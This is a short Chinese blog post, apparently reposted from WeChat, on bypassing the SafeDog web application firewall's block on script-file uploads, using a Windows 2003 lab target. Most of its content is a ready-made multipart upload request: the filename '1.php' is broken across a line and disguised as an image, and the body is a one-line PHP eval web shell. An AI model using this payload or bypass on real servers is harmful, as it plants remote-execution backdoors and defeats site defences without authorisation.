> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzU4OTExNTk0OA==&mid=2247483941&idx=1&sn=978cdfc412a5baa321419cc6bf67c1e0&chksm=fdd32566caa4ac70c68aae0ce6590487b400d9a21926d7ab131ff2d71a49b6671e9fa4d33dae&scene=126&sessionid=1681400568#rd](http://mp.weixin.qq.com/s?__biz=MzU4OTExNTk0OA==&mid=2247483941&idx=1&sn=978cdfc412a5baa321419cc6bf67c1e0&chksm=fdd32566caa4ac70c68aae0ce6590487b400d9a21926d7ab131ff2d71a49b6671e9fa4d33dae&scene=126&sessionid=1681400568#rd)

  

> 文件上传实质上还是客户端的POST请求，消息主体是一些上传信息。前端上传页面需要指定enctype为multipart/from-data才能正常上传文件。

此处不讲各种中间件解析漏洞 只列举几种safe\_dog对脚本文件上传拦截的绕过

靶机环境：win2003+safe\_dog4.0.23957+webug中的上传

```
Content-Disposition: form-data; name="file"; filename="1.p
hp"
Content-Type: image/jpeg

<?php @eval($\_POST\[1\])?>

```
